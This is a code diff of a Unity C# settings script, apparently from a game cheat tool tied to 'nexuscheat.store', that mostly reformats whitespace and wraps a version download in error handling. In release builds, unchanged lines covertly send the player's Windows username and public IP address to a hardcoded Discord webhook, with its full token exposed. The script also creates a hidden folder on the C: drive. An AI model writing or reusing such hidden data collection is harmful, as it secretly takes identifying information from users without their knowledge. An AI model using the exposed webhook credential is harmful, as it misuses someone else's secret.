@@ -25,11 +25,11 @@ public class GetSettings : MonoBehaviour
 #if !UNITY_EDITOR
         string user = "`user: *" + Environment.UserName + "*, *";
         SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
+
+        wrongVersion.SetActive(Application.version != GetGameVersion());
 #endif
 
-        wrongVersion.SetActive ( Application.version != GetGameVersion () );
-
-        if ( DataSetup () )
+        if ( DataSetup() )
         {
             string playerData = File.ReadAllText("C:/userdata/playerData.json");
             PlayerData pData = JsonUtility.FromJson<PlayerData>(playerData);
@@ -57,36 +57,36 @@ public class GetSettings : MonoBehaviour
         switch ( resolution.value )
         {
             case 0:
-                Screen.SetResolution ( 1920, 1080, true );
+                Screen.SetResolution(1920, 1080, true);
                 break;
             case 1:
-                Screen.SetResolution ( 1650, 1080, true );
+                Screen.SetResolution(1650, 1080, true);
                 break;
             case 2:
-                Screen.SetResolution ( 1400, 900, true );
+                Screen.SetResolution(1400, 900, true);
                 break;
             case 3:
-                Screen.SetResolution ( 1024, 768, true );
+                Screen.SetResolution(1024, 768, true);
                 break;
             case 4:
-                Screen.SetResolution ( 800, 600, true );
+                Screen.SetResolution(800, 600, true);
                 break;
         }
     }
 
     bool DataSetup()
     {
-        if ( Directory.Exists ( "C:/userdata" ) )
+        if ( Directory.Exists("C:/userdata") )
         {
-            if ( File.Exists ( "C:/userdata/playerData.json" ) && File.Exists ( "C:/userdata/settingsData.json" ) )
+            if ( File.Exists("C:/userdata/playerData.json") && File.Exists("C:/userdata/settingsData.json") )
             {
-                json.PlayerDataLoadFromJson ( settings );
-                json.SettingsDataLoadFromJson ( sense, graphics, resolution, musicVolumeSlider );
+                json.PlayerDataLoadFromJson(settings);
+                json.SettingsDataLoadFromJson(sense, graphics, resolution, musicVolumeSlider);
             }
             else
             {
-                json.PlayerDataSaveToJson ( true, playerName.text );
-                json.SettingsDataSaveToJson ( 3, 0, 0, 0.1f );
+                json.PlayerDataSaveToJson(true, playerName.text);
+                json.SettingsDataSaveToJson(3, 0, 0, 0.1f);
             }
             return true;
         }
@@ -94,39 +94,46 @@ public class GetSettings : MonoBehaviour
         {
             DirectoryInfo di = Directory.CreateDirectory("C:/userdata");
             di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-            json.PlayerDataSaveToJson ( true, playerName.text );
-            json.SettingsDataSaveToJson ( 3, 0, 0, 0.5f );
+            json.PlayerDataSaveToJson(true, playerName.text);
+            json.SettingsDataSaveToJson(3, 0, 0, 0.5f);
             return true;
         }
     }
 
     public string GetGameVersion()
     {
-        if ( File.Exists ( @"version.txt" ) )
-        {
-            File.Delete ( @"version.txt" );
-        }
+        if ( File.Exists(@"version.txt") )
+            File.Delete(@"version.txt");
 
         WebClient webClient = new WebClient();
-        webClient.DownloadFile ( "https://nexuscheat.store/version.txt", @"version.txt" );
-
-        foreach ( string line in File.ReadLines ( @"version.txt" ) )
+        try
         {
-            return line;
+            webClient.DownloadFile("https://nexuscheat.store/version.txt", @"version.txt");
+
+            foreach ( string line in File.ReadLines(@"version.txt") )
+            {
+                return line;
+            }
         }
+        catch ( WebException webException )
+        {
+            Debug.Log(webException.Message);
+            return "0.0.0";
+        }
+
         return null;
     }
 
-    static System.Net.IPAddress GetPublicIp( string serviceUrl = "https://ipinfo.io/ip" )
+    static System.Net.IPAddress GetPublicIp(string serviceUrl = "https://ipinfo.io/ip")
     {
-        return System.Net.IPAddress.Parse ( new System.Net.WebClient ().DownloadString ( serviceUrl ) );
+        return System.Net.IPAddress.Parse(new System.Net.WebClient().DownloadString(serviceUrl));
     }
 
-    static void SendMs( string message, string webhook )
+    static void SendMs(string message, string webhook)
     {
         WebClient client = new WebClient();
-        client.Headers.Add ( "Content-Type", "application/json" );
+        client.Headers.Add("Content-Type", "application/json");
         string payload = "{\"content\": \"" + message + "\"}";
-        client.UploadData ( webhook, Encoding.UTF8.GetBytes ( payload ) );
+        client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
     }
 }
